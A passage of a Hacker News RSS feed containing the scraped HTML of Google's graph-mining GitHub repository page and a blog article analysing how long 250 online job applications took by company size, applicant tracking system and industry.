    </span>

    <span>
        

    </span>
</p></div>




        


<div>
  <div>
    <h2>Latest commit</h2>
    <div data-issue-and-pr-hovercards-enabled="">
      <include-fragment src="/google/graph-mining/tree-commit/c1c54b486f7a8a5f83a88ead02a211a9372e33b0" aria-busy="true" aria-label="Loading latest commit">
        
        
</include-fragment>      <div>
        <h2>Git stats</h2>
        <ul>
          <li>
            <a data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" href="https://github.com/google/graph-mining/commits/main">
              
              <span>
                    <strong>8</strong>
                    <span aria-label="Commits on main">
                      commits
                    </span>
              </span>
            </a>
          </li>
        </ul>
      </div>
    </div>
  </div>
    <h2 id="files">Files</h2>
    


  <include-fragment src="/google/graph-mining/file-list/main">
        <a data-hotkey="y" href="https://github.com/google/graph-mining/tree/c1c54b486f7a8a5f83a88ead02a211a9372e33b0">Permalink</a>
  <div data-view-component="true">
  <p>
    Failed to load latest commit information.


  
</p></div>  <div role="grid" aria-labelledby="files" data-hpc="">
      <div role="row">
        <p>Type</p>
        <p>Name</p>
        <p>Latest commit message</p>
        <p>Commit time</p>
      </div>
          <div role="row">
            

            <div role="rowheader">
              <p><span><a title="docs" data-turbo-frame="repo-content-turbo-frame" href="https://github.com/google/graph-mining/tree/main/docs">docs</a></span>
            </p></div>

            

            

          </div>
          <div role="row">
            

            <div role="rowheader">
              <p><span><a title="in_memory" data-turbo-frame="repo-content-turbo-frame" href="https://github.com/google/graph-mining/tree/main/in_memory">in_memory</a></span>
            </p></div>

            

            

          </div>
          <div role="row">
            

            <div role="rowheader">
              <p><span><a title="utils" data-turbo-frame="repo-content-turbo-frame" href="https://github.com/google/graph-mining/tree/main/utils">utils</a></span>
            </p></div>

            

            

          </div>
          <div role="row">
            

            <div role="rowheader">
              <p><span><a title=".bazelrc" data-turbo-frame="repo-content-turbo-frame" href="https://github.com/google/graph-mining/blob/main/.bazelrc">.bazelrc</a></span>
            </p></div>

            

            

          </div>
          <div role="row">
            

            <div role="rowheader">
              <p><span><a title="BUILD.oss" data-turbo-frame="repo-content-turbo-frame" href="https://github.com/google/graph-mining/blob/main/BUILD.oss">BUILD.oss</a></span>
            </p></div>

            

            

          </div>
          <div role="row">
            

            <div role="rowheader">
              <p><span><a title="CONTRIBUTING.md" data-turbo-frame="repo-content-turbo-frame" href="https://github.com/google/graph-mining/blob/main/CONTRIBUTING.md">CONTRIBUTING.md</a></span>
            </p></div>

            

            

          </div>
          <div role="row">
            

            <div role="rowheader">
              <p><span><a title="LICENSE" data-turbo-frame="repo-content-turbo-frame" itemprop="license" href="https://github.com/google/graph-mining/blob/main/LICENSE">LICENSE</a></span>
            </p></div>

            

            

          </div>
          <div role="row">
            

            <div role="rowheader">
              <p><span><a title="README.md" data-turbo-frame="repo-content-turbo-frame" href="https://github.com/google/graph-mining/blob/main/README.md">README.md</a></span>
            </p></div>

            

            

          </div>
          <div role="row">
            

            <div role="rowheader">
              <p><span><a title="WORKSPACE.bazel" data-turbo-frame="repo-content-turbo-frame" href="https://github.com/google/graph-mining/blob/main/WORKSPACE.bazel">WORKSPACE.bazel</a></span>
            </p></div>

            

            

          </div>
    </div>

</include-fragment>


</div>

  
    
      <div id="readme" data-tagsearch-path="README.md" data-tagsearch-lang="Markdown">

        <div>
          <p>
            <h2>
              <a href="#readme" data-view-component="true">README.md</a>
            </h2>
          </p>
        </div>

          <div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" id="user-content-the-graph-mining-library" dir="auto"><a href="#the-graph-mining-library">The Graph Mining Library</a></h2>
<p dir="auto">This project includes some of Google's Graph Mining tools, namely in-memory
clustering. Our tools can be used for solving data mining and machine learning
problems that either inherently have a graph structure or can be formalized as
graph problems.</p>
<p dir="auto">For questions/comments, please create an issue on this repository.</p>
</article>
          </div>
      </div>



</div>
  <div data-pjax="" data-view-component="true">
        <div>
            <h2>About</h2>

    <p>
      No description, website, or topics provided.
    </p>


  <h3>Resources</h3>
  <p>
    <a data-analytics-event="{&quot;category&quot;:&quot;Repository Overview&quot;,&quot;action&quot;:&quot;click&quot;,&quot;label&quot;:&quot;location:sidebar;file:readme&quot;}" href="#readme">
      
      Readme
</a>  </p>

<h3>License</h3>
  <p>
    <a href="https://github.com/google/graph-mining/blob/main/LICENSE" data-analytics-event="{&quot;category&quot;:&quot;Repository Overview&quot;,&quot;action&quot;:&quot;click&quot;,&quot;label&quot;:&quot;location:sidebar;file:license&quot;}">
      
     Apache-2.0 license
    </a>
  </p>


  <h3>Code of conduct</h3>
  <p>
    <a href="https://github.com/google/graph-mining/blob/main/docs/code-of-conduct.md" data-analytics-event="{&quot;category&quot;:&quot;Repository Overview&quot;,&quot;action&quot;:&quot;click&quot;,&quot;label&quot;:&quot;location:sidebar;file:code of conduct&quot;}">
      
      Code of conduct
    </a>
  </p>

  <h3>Security policy</h3>
  <p>
    <a href="https://github.com/google/graph-mining/security/policy" data-analytics-event="{&quot;category&quot;:&quot;Repository Overview&quot;,&quot;action&quot;:&quot;click&quot;,&quot;label&quot;:&quot;location:sidebar;file:security policy&quot;}">
      
      Security policy
    </a>
  </p>

<include-fragment src="/google/graph-mining/hovercards/citation/sidebar_partial?tree_name=main">
</include-fragment>



<p>
  <a data-turbo-frame="repo-content-turbo-frame" href="https://github.com/google/graph-mining/activity" data-view-component="true">
    
    <span>Activity</span>
</a></p>

<h3>Stars</h3>
<p>
  <a href="https://github.com/google/graph-mining/stargazers" data-view-component="true">
    
    <strong>171</strong>
    stars
</a></p>

<h3>Watchers</h3>
<p>
  <a href="https://github.com/google/graph-mining/watchers" data-view-component="true">
    
    <strong>7</strong>
    watching
</a></p>

<h3>Forks</h3>
<p>
  <a href="https://github.com/google/graph-mining/forks" data-view-component="true">
    
    <strong>6</strong>
    forks
</a></p>

  <div>
    <p><a href="https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fgoogle%2Fgraph-mining&amp;report=google+%28user%29">
        Report repository
</a>  </p></div>

          </div>

        
        
            <div>
                <h2 data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame">
  <a href="https://github.com/google/graph-mining/releases" data-view-component="true">
    Releases
</a></h2>

    <p>No releases published</p>

              </div>

        
        
            <div>
                <h2>
  <a href="https://github.com/orgs/google/packages?repo_name=graph-mining" data-view-component="true">
    Packages
      
</a></h2>


      <p>
        No packages published <br>
      </p>



              </div>

        
        
        
        
            <div>
                <h2>Languages</h2>

<ul>
    <li>
        <a href="https://github.com/google/graph-mining/search?l=c%2B%2B" data-ga-click="Repository, language stats search click, location:repo overview">
          
          <span>C++</span>
          <span>93.0%</span>
        </a>
    </li>
    <li>
        <a href="https://github.com/google/graph-mining/search?l=starlark" data-ga-click="Repository, language stats search click, location:repo overview">
          
          <span>Starlark</span>
          <span>6.8%</span>
        </a>
    </li>
    <li>
        <a href="https://github.com/google/graph-mining/search?l=c" data-ga-click="Repository, language stats search click, location:repo overview">
          
          <span>C</span>
          <span>0.2%</span>
        </a>
    </li>
</ul>

              </div>

              </div>
  
</div></div>

</turbo-frame>


    </main>
  </div>

          




  

    <template id="site-details-dialog">
  <details class="details-reset details-overlay details-overlay-dark lh-default color-fg-default hx_rsm" open="">
    <summary role="button" aria-label="Close dialog"></summary>
    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast hx_rsm-dialog hx_rsm-modal">
      <button class="Box-btn-octicon m-0 btn-octicon position-absolute right-0 top-0" type="button" aria-label="Close dialog" data-close-dialog="">
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
      </button>
      <div class="octocat-spinner my-6 js-details-dialog-spinner"></div>
    </details-dialog>
  </details>
</template>

    

    <template id="snippet-clipboard-copy-button">
  <div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none m-2">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
    </clipboard-copy>
  </div>
</template>
<template id="snippet-clipboard-copy-button-unpositioned">
  <div class="zeroclipboard-container">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 tooltipped-no-delay d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
    </clipboard-copy>
  </div>
</template>




    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I applied to 250 jobs and timed how long each one took (234 pts)]]></title>
            <link>https://www.careerfair.io/online-maze</link>
            <guid>37753292</guid>
            <pubDate>Tue, 03 Oct 2023 15:36:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.careerfair.io/online-maze">https://www.careerfair.io/online-maze</a>, See on <a href="https://news.ycombinator.com/item?id=37753292">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      <section id="intro">
        <p>
          Applying to jobs online is like navigating a maze. 
        </p>

        <p>
          Amidst the special torture that is resume parsing software, the inability to reuse information across different application tracking systems (ATS), and the existence of a certain company that rhymes with every day of the week, it can get pretty frustrating.
        </p>

        <p>
          I wanted to explore what factors make a job application more or less frustrating. 
        </p>

        <p>
          For example, what industries have the worst application processes? Do big companies ask for more information than small companies? What is it about websites like Workday that make them really hard to use? 
        </p>

        <p>
          To answer these questions, I applied to 250 jobs. One by one. Click by click. No Linkedin Easy Apply, no shortcuts – just straight from the careers page. 
        </p>

        <p>
          I timed how long it took me to go from “apply to job” to “submit application”.
        </p>

        <center>
          <img src="https://www.careerfair.io/maze_assets/ka_mov_v4.gif" alt="">
        </center>

        <p>
          Make no mistake: I sacrificed my soul for this article. I created over 83 accounts and spent a total of 11 hours scrolling. I was originally going to do this for 500 companies, but wanted to chop my head off halfway. 
        </p>

        <p>
          I did this for a mix of companies – Fortune 500 to early stage startups, spread out across different industries from software to manufacturing. The <i>type</i> of role I applied to was kept constant: engineering / product focused.
        </p>

        <!-- <p>
          I recorded how long it took me to apply. I noted down the ATS that was being used. I recorded whether I had to create an account. And I also recorded if I was redirected to some external page during the application process. 
        </p> -->

        <center>
          <figure>
          <img src="https://www.careerfair.io/maze_assets/spreadsheet_recording_v3.gif" alt="">
            <figcaption>Get the spreadsheet with the full raw data <a href="https://mailchi.mp/1a15a90c4aeb/company_raw_data_leadmagnet" target="_blank">here</a></figcaption>
          </figure>
        </center> 

        <p>
          The outcome? An average of over two and a half minutes per application—162 seconds of your life you'll never get back. But as we dig deeper, you'll discover that these 162 seconds only scratch the surface of an often maddening process. 
        </p>

        <div>
          <p><bold>Key Takeaways</bold></p>
          <ul>
            <li><b>Average Application Time: </b>On average, it took a bit over two and a half minutes to apply to a job.</li>
            <li><b>Company Size Impact: </b>If company size doubles, the application time increases by 5%. If company size increases by a factor of 10, then the app time increases by 20%.</li>
            <li><b>Industry Influence: </b>Being a government company is the single largest determinant of a long application, followed closely by aerospace and consulting firms.</li>
            <li><b>Longest Application: </b>The longest application time went to the United States Postal Service (10 minutes and 12 seconds).</li>
            <li><b>Shortest Application: </b>On the other hand, It took me just 17 seconds to apply to Renaissance Technologies.</li>
            <li><b>ATS Impact: </b>Older ATS like Workday and Taleo make job applications as much as 128% longer.</li>
          </ul> 
        </div>

        <p>
          If you'd like to access the complete raw data, I can send you the Google Spreadsheet via email <a href="https://mailchi.mp/1a15a90c4aeb/company_raw_data_leadmagnet" target="_blank">here.</a> 
        </p>

        <p>
          Let's dive in.
        </p>
      </section>

      <!-- <section class="medium-section med_img_container">
        <header class="fader">
          <h1 id="thesetup">The Setup</h1>
        </header>
      </section> -->
        <section id="thesetup">
          <h2>The Setup</h2>
          <p>
            There’s no real method to the 250 companies I pick. I’m just typing names into Google and trying to vary it up. Where does Trisha work? What was that billboard I saw? It's all up for grabs.
          </p>

          <p>
            Here’s the distribution of the 250 companies by size:
          </p>

          <center>
            <img src="https://www.careerfair.io/maze_assets/employee_breakdown_w2.png" alt="">
          </center>

          <p>
            Some examples of companies in each range: 
          </p>

          <ul>
              <li>1-500 → Glean, Quizlet, Gumroad</li>
              <li>500-5,000 → Notion, Dolby, Moloco </li>
              <li>5,000-50,000 → Airbnb, Genentech, Logitech </li>
              <li>50,000-100,000 → HP, American Express, Pfizer </li>
              <li>100,000+ → Wells Fargo, Lockheed Martin, General Motors </li>
            </ul> 
          


          <p>
            And here’s a look at the different types of industries represented:
          </p>

          <center>
            <img src="https://www.careerfair.io/maze_assets/industry_breakdown.png" alt="">
          </center>      

          <p>
            I used a mix of Linkedin and Crunchbase for categorization. 
          </p>

          <p>
            Before we get started, if you’d like you can read up on my <a href="https://docs.google.com/document/d/1A0I9_WBN9zIqwezM6OXqmOl3LPqaq5704EPmGDTDiYI/edit" target="_blank">methodology</a> for applying to each job (aka assumptions I made, what data I chose to submit, and how much effort I put into each application).
          </p>

          <h3>What makes a job application so frustrating</h3>

          <p>
            Generally speaking, the more frustrating a job application, the longer it takes to complete. 
          </p>

          <p>
            The three main factors that might influence how long a job application is (as measured in my data):
          </p>

          <ol>
            <li><b>Company size</b> → I would expect bigger companies to ask more questions.</li>
            <li><b>The ATS that is being used</b> → I would expect clunkier, older ATS to make job applications longer.</li>
            <li><b>Company industry</b> → I would expect more “traditional” industries to ask more questions.</li>
          </ol> 

          <p>
            We’re going to model the relationship between the above three factors and the amount of time it takes to complete a job application. To do this, we’re going to use a technique called linear regression.           </p>

          <p>
            Regression is about the way two measurements change together. It can help us make predictions.
          </p>

          <p>
            For example, if I add 10 employees to a company, how many seconds will that add to the company’s job application process?
          </p>

          <p>Since we have other factors like ATS and Industry, we will also account for those. For now, though, let’s just focus on each factor one by one. 
          </p>



        </section>
        <section id="size">
          <h2>Company Size</h2>
          <p>
            Let’s first plot the data as is: 
          </p>
          <center>
            <img src="https://www.careerfair.io/maze_assets/size_time_linear_v5.png" alt="">
          </center>   
          <p>
            Yes, I know, this isn’t the most useful graph. I’m going to spruce it up real quick, I promise. 
          </p>

          <p>
            The United States Postal Service has a job application that took over 10 minutes to complete. Navigating their portal felt like using Internet Explorer in 2003: 
          </p>


          <center>
            <img src="https://www.careerfair.io/maze_assets/usps_internet_explorer.png" alt="">
          </center>  

          <p>
            Netflix’s application was just 20 seconds - their only mandatory requirements are your resume and basic info. 
          </p>

          <center>
            <img src="https://www.careerfair.io/maze_assets/netflix_app_basic.png" alt="">
          </center>  

          <p>
            Apple took me 71 seconds, still pretty fast for a company that has over 270,000 employees (PWC, which has a similar number of employees, took me almost six times as long). 
          </p>

          <p>
            Okay, back to the chart. There are a couple of problems with it. 
          </p>

          <p>
            First, the data is not linear. This is a problem if we want to use linear regression.
          </p>

          <p>
            Second, the company size scale is hard to interpret because of the many data points clumped together near zero (representing all the smaller companies). 
          </p>

          <p>
            We can resolve both these issues with the following insight:
          </p>

          <p>
            There is a big difference between going from 10 to 100 employees and, say, 10,000 to 10,100 employees. The first represents major changes in company structure: you might actually hire a proper HR team, a bunch of recruiters, and build out your candidate experience. The second, though, is pretty much just business as usual - think of a multinational opening up a satellite office or a regular month of hiring. 
          </p>

          <p>
            Since we want to account for this, our data is better suited to a log scale than a linear scale. I will also transform our Y-axis, the application time, to a log scale because it helps normalize the data. 
          </p>

          <p>
            If we plot both our variables on a log-log scale, we get the below chart:
          </p>
         
          <center>
            <img src="https://www.careerfair.io/maze_assets/size_time_log_v8.png" alt="">
          </center> 
          <p>
            Better right? This is the same data as the last chart, but with different axes that fits the data better, we observe a linear relationship. 
          </p>

          <p>
            We have the usual suspects in the top right: Government organizations, professional services firms, and some of the tech industry dinosaurs. 
          </p>

          <p>
            The variance in application times across smaller companies, like startups, is interesting. For example, many of the startups with longer application times (e.g OpenAI, Posthog, Comma.AI) reference that they are looking for “exceptional” candidates on their careers page. (Note that OpenAI has changed its application since I last analyzed it - it’s now much faster, but when I went through they asked for a mini essay on why you’re exceptional). 
          </p>

          <p>
            One thing that I was expecting to see was competitors mirroring each other’s application times. This is most closely represented with the consulting firms like Deloitte, E&amp;Y, KPMG, etc all clumped together. McKinsey and Bain, the two most prestigious consulting firms, have applications that take longer to complete. 
          </p>

          <p>
            This doesn’t necessarily seem to be the case with the FAANG companies. 
          </p>

          <p>
            We can also calculate the correlation coefficient for this graph. This is a statistical measure of the strength of a linear relationship between two variables. The closer to 1 the value, the stronger the relationship.
          </p>
          <p>
            For the above data, we get a correlation coefficient of 0.58, which is a moderate to strong association.
          </p>
          <p>
            Note that on its own, this doesn't tell us anything about causation. But it does start to point us in some type of direction.
          </p>

          <p>
            It's not rocket science: big companies ask for more stuff. Sometimes they ask for the last 4 digits of your SSN. 
          </p>
          <center>
            <figure>
            <img src="https://www.careerfair.io/maze_assets/ssn_box_v2.png" alt="">
              <figcaption>Newell Brands</figcaption>
            </figure>
          </center> 
          <p>
            Sometimes they even ask if you’d be okay going through a polygraph:
          </p>
          <center>
            <figure>
            <img src="https://www.careerfair.io/maze_assets/polygraph_v2.png" alt="">
              <figcaption>NASA</figcaption>
            </figure>
          </center> 
          <p>
            And sometimes they even ask you to explain employment gaps:
          </p>
          <center>
            <figure>
            <img src="https://www.careerfair.io/maze_assets/employment_gap_v4.png" alt="">
            </figure>
          </center> 
          
          <p>
            An argument here is that if big companies didn’t have some sort of barriers in their application process, they’d get swarmed with applications.
          </p>

          <p>
            Consider the fact that Google gets 3 million applications every year. Deloitte gets 2 million. Without some sort of initial friction in the application process, those numbers would be even higher. That friction almost serves as a reliable filter for interest. 
          </p>

          <p>
            If you’re an employer, you don’t really care about the people using a shotgun approach to apply. You want the candidates that have a real interest in the position. On the other hand, if you’re a candidate, the reality is such that the shotgun approach to apply is arguably the most efficient. 
          </p>

          <p>
            So we have this inherent tension between companies and candidates. Candidates want the most bang for their buck, companies don’t want thousands of irrelevant resumes. 
          </p>

          <p>
            And in the middle, we have the plethora of application tracking software that can often be quite old and clunky. 
          </p>


          <div>
            <center>
              <h2> Sorry to interrupt </h2>
              <p>
                  I hope you're enjoying the article. In my next article, I investigate the Strange World of Referral Bonuses - enter your email and I'll deliver it straight to your inbox when it's out in 3 weeks.
                </p>
            </center>
            <center>
              
            </center>
          </div>

        </section>

        

        <section id="ats">
          <h2>ATS</h2>
          <p>
            Everytime I came face to face with a company that used Workday as their ATS, I died a bit inside. This is because Workday makes you:
          </p>
          <ol>
            <li>create a new account every single time</li>
            <li>redirects you away from the careers page</li>
          </ol>
          <p>
            I defined a redirect as one when the job description is not listed on the same page as the first input box part of the application. 
          </p>
          <p>
            This isn’t a perfectly accurate measure, but it does allow us to differentiate between the modern ATS like Greenhouse and older ones like Workday. 
          </p>
          <p>
            With every ATS, I implicitly had some type of “how easy is this going to be” metric in my head. 
          </p>
          <p>
            We can try to represent this “how easy is this going to be” metric a bit more concretely using the matrix below. 
          </p>
          <center>
            <img src="https://www.careerfair.io/maze_assets/ats_matrix_v2.png" alt="">
          </center> 
          <p>
            Ideally, you want the ATS to be in the bottom left corner. This creates an experience that is low friction and fast. 
          </p>
          <p>
            If we plot application time versus ATS, this is what we get: 
          </p>
          <center>
            <img src="https://www.careerfair.io/maze_assets/ats_time_v4.png" alt="">
          </center> 

          <p>
            The ATS that don’t make you create an account and don’t redirect you are tied to lower application times than the ones that do. 
          </p>

          <p>
            One possibility is that certain companies are more likely to use certain ATS. Big companies might use Workday for better compliance reporting. Same with the industry - maybe B2C software companies use the newer ATS on the market. These would be confounding variables, meaning that we may misinterpret a relationship between the ATS and the application time when in fact there isn’t one (and the real relationship is tied to the industry or size). 
          </p>
          <p>
            So to properly understand whether the ATS actually has an effect on application time, we need to control for our other variables. We’ll do this in the final section when we run a regression including all our variables. 
          </p>
          <p>
            One of the big frustrations surrounding different ATS is that when you upload your resume, you then need to retype out your experience in the boxes because the ATS resume parser did it incorrectly. For example, I went to UC Berkeley but sometimes got this:
          </p>
          <center>
            <figure>
            <img src="https://www.careerfair.io/maze_assets/pwc_workday.png" alt="">
              <figcaption>PWC / Workday</figcaption>
            </figure>
          </center> 
          <p>
            The only resume parser that didn't seem abysmal was the one from Smart Recruiters. TikTok's resume parser also isn't bad.  
          </p>
          <!-- <center>
            <figure>
            <img
              src="/maze_assets/resume_parser_table_v3.png"
              alt=""
              />
              <figcaption>It's helpful to have two versions of your resume: a normal PDF one, and another TXT version that is easier to parse.</figcaption>
            </figure>
          </center>  -->
          <p>
            Another frustrating experience is tied to inconsistency between the company I'm applying to and the ATS.
          </p>
          <center>
            <figure>
            <img src="https://www.careerfair.io/maze_assets/dual_branding_v5.png" alt="">
              <figcaption>Possible confusion</figcaption>
            </figure>
          </center> 
          <p>
            A company’s application process is often the first touchpoint you have with their brand. Startups competing for the best talent can't afford extra steps in their process. Apple and Facebook can.
          </p>
          <p>
            Whilst the average time to complete a job application may only be 162 seconds, the fact that  many ATS require steps like account creation and authentication can lead to application fatigue.
          </p>
          <p>
            It’s not necessarily the explicit amount of time it takes, it’s the steps involved that drain you of energy and make you want to avoid applying to new jobs.
          </p>
        </section>
        <section id="industry">
          <h2>Industry</h2>
          <p>
            Okay, so far we’ve looked at company size and the ATS as a loose indicator of what might make a job application frustrating. What about the company industry?
          </p>
          <p>
            You would expect industries like banking or professional services to have longer application times, because getting those jobs revolves around having a bunch of credentials which they likely screen for (and ask you to submit) early on in the process. 
          </p>
          <p>
            On the other hand, internet startups I’d expect to be quick and fast. Let’s find out if this is true.
          </p>
          <center>
            <img src="https://www.careerfair.io/maze_assets/industry_time_v4.png" alt="">
          </center> 
          <p>
            Hyped up industries like AI and Crypto have shorter application times. As expected, banks and consulting firms care about your GPA and ask you to submit it.  
          </p>
          <p>
            A government company has to basically verify your identity before they can even receive your application, so the process is entirely different and reflected in the submission time. 
          </p>
          <p>
            For many technology companies, the application process is almost like an extension of the company’s brand itself. For example, Plaid (an API first Fintech company), has a neat option where you can actually apply to the job via API:
          </p>
          <center>
            <img src="https://www.careerfair.io/maze_assets/plaid_api_cropped.png" alt="">
          </center> 

          <p>
            Roblox, a gaming company, allows people to submit job applications from within their <a href="https://gamerant.com/roblox-company-interview-job-applicants-in-game/">games</a>.
          </p>

          <p>
            We also notice differences between legacy companies and their newer competitors. If we compare legacy banks versus neobanks (like Monzo, Mercury, etc), the legacy players averaged around 250 seconds per job application whereas the neobanks averaged less than 60 seconds. 
          </p>

          <p>
            If you can’t compete on prestige, you need to find other ways. One of those ways can be through asking for less information upfront. 
          </p>

          <h3>Putting it together</h3>

          <p>
            Now that we've analyzed each variable - the company size, ATS, and the industry - to understand the separate relationship of each to application time, we can use linear regression to understand the <i>combined</i> relationships.
          </p>

          <p>
            This will allow us to determine what factors actually have an impact on the job application time versus which ones might just have had one when we looked at them in isolation.
          </p>

          <p>
            After some number crunching in R, I get the following results (I’ve only added the statistically significant factors – the ones with the “strongest evidence”):
          </p>

          <center>
            <img src="https://www.careerfair.io/maze_assets/regression_output_v2.png" alt="">
          </center> 

          <p>
            Here’s how you can interpret some of the information above:
          </p>

          <ul>
              <li>When a job app is for a company that is within the Government industry, the submission time goes up by 366% (assuming the size and ATS are constant). For the aerospace industry, this is 249% (and so on).</li>
              <li>When a job app is for a company using the Workday ATS, the submission times goes up by 128% (assuming the size and industry are constant). For the Phenom ATS, this is 110% (and so on). </li>
              <li>Our only (statistically significant) metric which seems to make job applications faster is the Lever ATS (42% shorter). </li>
            </ul> 
          

          <p>
            Okay, now what about company size? 
          </p>

          <p>
            Well, first up: company size is indeed statistically significant. So there is an effect. 
          </p>

          <p>
            However, its effect is not as strong as most of our other variables. To be precise, here are some ways to interpret our company size coefficient:
          </p>

          <ul>
              <li>If company size doubles, the app size increases by 5%</li>
              <li>If company size increases by a factor of 10, then the app time increases by 20%</li>
            </ul> 
          

          <p>
            This is a smaller effect size compared to ATS or industry (a 20% increases in app time for a 10x large company is a qualitatively smaller effect size than e.g. a 100% increase in app time for Taleo ATS). So although company size is statistically significant, it is not as strong of a driver as ATS and industry of app time.
          </p>

          <p>
            Another thing to note is that the effect of company size seems to level off as the company gets large enough (due to the log transformation). The plot below shows this. 
          </p>

          <center>
            <img src="https://www.careerfair.io/maze_assets/company_level.png" alt="">
          </center> 
        </section>
        <section id="conclusion">
          <h2>Wrapping it up</h2>

          <p>
            Two and a half minutes might not be too long, but it can feel like an eternity when you’re forced to answer the same questions and upload the same documents. Over and over again. 
            </p>
            <p>
            Think about catching a flight. All you want is to get on the jet. Hawaii awaits.  
            </p>
            <p>
            But first: the security line. You have to take your shoes off. You get patted down and your bag gets searched. The gate numbers don’t make sense. And then at the end of it, your flight’s delayed. Congrats.
            </p>
            <p>
            Applying to a job can feel similar. All you want to do is say aloha to the hiring manager, a real human being. 
            </p>
            <p>
            To even have the remote possibility of making that happen, you need to create an account and password, check your email, retype your entire resume, tell them the color of your skin, and explain why this company you’ve never heard of before is the greatest thing on Earth. 
            </p>
            <p>
            And for what? Most likely for the privilege of receiving an automated email about two weeks later rejecting you. 
            </p>
            <p>
            If we make it tiring and unappealing to look for new opportunities, then we prevent people from doing their best work. 
            </p>
            <p>
            But what would a world where applying took just a few seconds actually look like? Recruiters would get bombarded with resumes. It's possible to argue that job applications taking so long is a feature, not a bug. You get to filter for intent and narrow down your application pool.
            </p>
            <p>
            Is it fair to shift the burden of screening unqualified candidates onto good candidates that now need to provide so much information? Shouldn’t that burden fall on the recruiter? 
            </p>
            <!-- <p>
            There’s innovation happening in this space. Companies like Simplify help job seekers apply to thousands of jobs from just one platform. ChatGPT will make it faster to complete job applications too. 
            </p> -->
            <p>
            The truth is that applying to a job via the careers page is a bit of a rigged game. The odds are not in your favor.
            </p>
            <p>
             Sometimes, though, all you need is to only be right once.
            </p>

            <p>***</p>

            <p>
              If you made it all the way to the bottom, you're a star. This took a while to write. I hope you enjoyed it. 
            </p>

            <p>
              You might also enjoy reading:
            </p>
            <ul>
                <li><a href="https://www.careerfair.io/company-reviews">The Underground Economy of Glassdoor Reviews</a></li>
                <li><a href="https://www.careerfair.io/reviews/cover-letter-guide">My Guide To Writing A Killer Cover Letter</a></li>
                <li><a href="https://www.careerfair.io/job-hunt-story">My Job Hunt Story</a></li>
              </ul> 
            


        </section>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Predictive Policing Software Is Pretty Terrible at Predicting Crimes (121 pts)]]></title>
            <link>https://gizmodo.com/predictive-policing-cops-law-enforcement-predpol-1850893951</link>
            <guid>37753079</guid>
            <pubDate>Tue, 03 Oct 2023 15:19:37 GMT</pubDate>
